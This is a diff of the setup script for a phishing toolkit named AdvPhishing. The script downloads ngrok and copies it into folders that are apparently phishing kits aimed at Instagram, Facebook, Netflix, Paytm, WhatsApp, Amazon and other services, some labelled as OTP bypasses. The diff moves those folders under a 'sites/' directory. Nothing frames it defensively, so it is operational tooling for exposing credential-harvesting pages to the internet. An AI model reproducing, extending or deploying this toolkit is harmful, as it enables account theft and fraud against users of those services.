@@ -7,21 +7,21 @@ echo ""
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
 unzip ngrok-stable-linux-amd64.zip
 cp -R ngrok github/
-cp -R ngrok Hotstar-otp-bypass/
-cp -R ngrok instagram/
-cp -R ngrok Linkedin/
-cp -R ngrok Netflix/
-cp -R ngrok Paytm-Phishing/
-cp -R ngrok spotify/
-cp -R ngrok whatsapp-phishing/
-cp -R ngrok facebook/
-cp -R ngrok google-otp/
-cp -R ngrok instafollow/
-cp -R ngrok ipfinder/
-cp -R ngrok ola-otpbypass/
-cp -R ngrok UberEats-Phishing/
-cp -R ngrok Zomato-Phishing/
-cp -R ngrok amazonsign/
+cp -R ngrok sites/Hotstar-otp-bypass/
+cp -R ngrok sites/instagram/
+cp -R ngrok sites/Linkedin/
+cp -R ngrok sites/Netflix/
+cp -R ngrok sites/Paytm-Phishing/
+cp -R ngrok sites/spotify/
+cp -R ngrok sites/whatsapp-phishing/
+cp -R ngrok sites/facebook/
+cp -R ngrok sites/google-otp/
+cp -R ngrok sites/instafollow/
+cp -R ngrok sites/ipfinder/
+cp -R ngrok sites/ola-otpbypass/
+cp -R ngrok sites/UberEats-Phishing/
+cp -R ngrok sites/Zomato-Phishing/
+cp -R ngrok sites/amazonsign/
 chmod 7777 AdvPhishing.sh
 clear
 
